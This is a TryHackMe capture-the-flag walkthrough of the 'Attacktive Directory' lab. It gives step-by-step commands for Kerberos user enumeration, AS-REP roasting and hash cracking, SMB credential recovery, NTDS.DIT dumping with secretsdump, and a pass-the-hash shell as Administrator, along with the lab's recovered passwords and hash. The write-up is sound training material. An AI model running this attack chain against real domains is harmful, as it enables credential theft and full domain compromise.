# TryHackMe: Attacktive Directory — Complete Walkthrough

> A beginner-friendly yet in-depth walkthrough demonstrating how an attacker can compromise an Active Directory environment—from initial reconnaissance to full Domain Administrator access.

---

## Introduction

**Attacktive Directory** is one of the best Active Directory rooms on TryHackMe for understanding how a real-world attacker approaches a Windows domain.

Instead of jumping straight into exploitation, this room teaches the complete attack chain:

* Reconnaissance
* Service Enumeration
* User Enumeration
* Kerberos Attacks
* Credential Harvesting
* SMB Enumeration
* Active Directory Hash Dumping
* Pass-the-Hash Authentication
* Domain Administrator Compromise

By the end of this room, you'll understand not only **how** these attacks work, but **why** attackers perform each step.

---

## Attack Path

```text
VPN Connection
        │
        ▼
Nmap Enumeration
        │
        ▼
SMB + Kerberos Enumeration
        │
        ▼
User Enumeration
        │
        ▼
AS-REP Roasting
        │
        ▼
Hash Cracking
        │
        ▼
RDP Access
        │
        ▼
SMB Share Enumeration
        │
        ▼
Recover Backup Credentials
        │
        ▼
Dump NTDS.DIT
        │
        ▼
Pass-the-Hash
        │
        ▼
Domain Administrator
```

---

# Lab Overview

Throughout this walkthrough we'll simulate a complete Active Directory attack against the **Attacktive Directory** machine on TryHackMe.

The objectives are to:

* Enumerate the domain
* Discover valid users
* Abuse Kerberos misconfigurations
* Crack authentication hashes
* Gain an initial foothold
* Enumerate internal resources
* Dump Active Directory credentials
* Escalate privileges to Administrator

---

# Connecting to the Lab

Download the VPN configuration file from the TryHackMe Access page and establish the VPN connection.

```bash
sudo openvpn <file.ovpn>
```

Once connected, verify connectivity to the target machine before beginning enumeration.

---

# Video Walkthrough

I also created a **4-hour in-depth YouTube walkthrough** explaining every concept and command in detail.

📺 **YouTube:** *(Add your link here)*

---

# Environment Setup

Before beginning, update your Kali Linux machine.

```bash
sudo apt update && sudo apt upgrade
```

---

# Installing Impacket

One of the most important toolkits for Active Directory assessments is **Impacket**.

Impacket is a collection of Python scripts that implement Windows network protocols such as:

* SMB
* MSRPC
* LDAP
* Kerberos

It is widely used during penetration tests for:

* Kerberos attacks
* Credential dumping
* Pass-the-Hash attacks
* Lateral movement
* Active Directory enumeration

Clone and install it:

```bash
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket

pip3 install -r /opt/impacket/requirements.txt

cd /opt/impacket

python3 setup.py install
```

We'll also install BloodHound and Neo4j for Active Directory visualization.

```bash
sudo apt install bloodhound neo4j
```

---

# Phase 1 — Initial Enumeration

Every penetration test starts with reconnaissance.

Our first objective is identifying exposed services.

```bash
nmap -sC -sV <IP> -oN nmap_output.txt
```

### Why these options?

| Option | Purpose                        |
| ------ | ------------------------------ |
| `-sC`  | Default NSE scripts            |
| `-sV`  | Service version detection      |
| `-oN`  | Save output for later analysis |

---

## Scan Results

Important services discovered:

| Port | Service  |
| ---- | -------- |
| 80   | HTTP     |
| 88   | Kerberos |
| 135  | MSRPC    |
| 139  | NetBIOS  |
| 389  | LDAP     |
| 445  | SMB      |

The scan also revealed:

```
NetBIOS Name: THM-AD
Domain: spookysec.local
```

This immediately tells us we're dealing with an Active Directory Domain Controller.

---

# SMB Enumeration

SMB often exposes valuable information.

Using **Enum4Linux**:

```bash
enum4linux <IP>
```

This tool helps enumerate:

* SMB Shares
* Users
* Groups
* Domain Information
* Security Identifiers (SIDs)
* Relative Identifiers (RIDs)

Understanding SIDs and RIDs is important because attackers frequently leverage them during privilege escalation and user enumeration.

---

# Phase 2 — Kerberos User Enumeration

Since Kerberos is running on port **88**, we can enumerate valid usernames.

We'll use **Kerbrute**.

Kerbrute can:

* Enumerate users
* Perform password spraying
* Conduct brute-force attacks

Run:

```bash
kerbrute userenum \
--dc <DC-IP> \
-d spookysec.local \
userlist.txt
```

Valid accounts discovered:

```
svc-admin

administrator

backup
```

Finding valid usernames is a huge advantage before attempting any authentication attacks.

---

# Phase 3 — AS-REP Roasting

Now comes our first real attack.

AS-REP Roasting targets user accounts configured with:

> **"Do not require Kerberos pre-authentication"**

Because pre-authentication is disabled, the Domain Controller returns encrypted authentication data **without verifying the user's identity first**.

That encrypted response can then be cracked offline.

---

## Requesting AS-REP Hashes

Using Impacket:

```bash
GetNPUsers.py spookysec.local/svc-admin \
-no-pass \
-dc-ip <IP>
```

Results:

✅ `svc-admin` is vulnerable.

❌ `backup` is not.

---

# Cracking the Hash

The returned hash is:

```
Kerberos 5 AS-REP etype 23
```

Hashcat Mode:

```
18200
```

Crack it using:

```bash
hashcat -m 18200 -a 0 hash.txt passwordlist.txt
```

Eventually we recover:

```
management2005
```

Our first valid domain credentials.

---

# Initial Access via RDP

Using the recovered credentials:

```bash
rdesktop <IP>
```

Login:

```
Username:
spookysec.local\svc-admin

Password:
management2005
```

Initial foothold achieved.

---

# Phase 4 — Post-Exploitation Enumeration

Now that we have authenticated access, it's time to explore the network.

List available SMB shares:

```bash
smbclient -L //<IP>/ \
-U svc-admin
```

Available shares include:

* ADMIN$
* backup
* C$
* IPC$
* NETLOGON
* SYSVOL

The **backup** share immediately stands out.

---

# Recovering Additional Credentials

Access the share:

```bash
smbclient //<IP>/backup -U svc-admin
```

Download:

```
backup.txt
```

Contents:

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Recognizing the Base64 encoding, decode it (for example, using CyberChef).

Recovered credentials:

```
backup@spookysec.local

backup2517860
```

We now possess another valid domain account.

---

# Logging in as the Backup User

Authenticate again through RDP:

```bash
rdesktop <IP>
```

```
Username:
spookysec.local\backup

Password:
backup2517860
```

Success!

We can now retrieve the **User Flag** from the desktop.

---

# Phase 5 — Dumping Active Directory Hashes

Now we move toward full domain compromise.

The Active Directory database (**NTDS.DIT**) stores:

* User accounts
* NTLM password hashes
* Authentication information
* Group memberships

Using Impacket's `secretsdump.py`:

```bash
secretsdump.py \
spookysec.local/backup:backup2517860@<IP>
```

Among the dumped credentials:

```
Administrator

NTLM Hash:
0e0363213e37b94221497260b0bcb4fc
```

---

# Pass-the-Hash Attack

One of the biggest advantages of NTLM authentication is that **you don't always need the plaintext password**.

If you possess the NTLM hash, you can authenticate directly.

Using Evil-WinRM:

```bash
evil-winrm \
-i <IP> \
-u Administrator \
-H <NTLM_HASH>
```

Shell obtained.

Administrator access achieved.

From here we can:

* Access every user's desktop
* Read all flags
* Manage the domain
* Fully compromise the machine

Mission accomplished.

---

# Tools Used

| Tool        | Purpose                      |
| ----------- | ---------------------------- |
| Nmap        | Network Enumeration          |
| Enum4Linux  | SMB Enumeration              |
| Kerbrute    | Kerberos User Enumeration    |
| Impacket    | Kerberos & AD Exploitation   |
| Hashcat     | Offline Password Cracking    |
| SMBClient   | SMB Share Enumeration        |
| RDesktop    | Remote Desktop Access        |
| SecretsDump | Dump AD Password Hashes      |
| Evil-WinRM  | Pass-the-Hash & Remote Shell |

---

# Key Takeaways

This room provides an excellent introduction to attacking Active Directory from an offensive security perspective. Throughout the lab, we learned how to:

* Perform comprehensive Active Directory reconnaissance.
* Enumerate SMB, LDAP, and Kerberos services.
* Identify valid domain users using Kerberos.
* Exploit AS-REP Roasting misconfigurations.
* Crack Kerberos authentication hashes.
* Gain an initial foothold through Remote Desktop Protocol (RDP).
* Enumerate SMB shares to uncover sensitive information.
* Recover and reuse exposed credentials.
* Dump NTDS.DIT password hashes using Impacket.
* Escalate privileges using a Pass-the-Hash attack.
* Achieve full Domain Administrator access.

More importantly, this room demonstrates how seemingly minor misconfigurations can be chained together into a complete domain compromise.

---

# Final Thoughts

Attacktive Directory remains one of the best beginner-friendly Active Directory labs because it mirrors a realistic attack path while introducing essential offensive security concepts.

If you're preparing for certifications such as **PNPT**, **CRTP**, **OSCP**, or pursuing a career in **Red Teaming** or **Active Directory penetration testing**, this room is an excellent starting point.

If you found this walkthrough helpful, consider leaving a ⭐ on the repository. Feedback, suggestions, and discussions are always welcome.

Happy learning, and happy hacking! 🚀
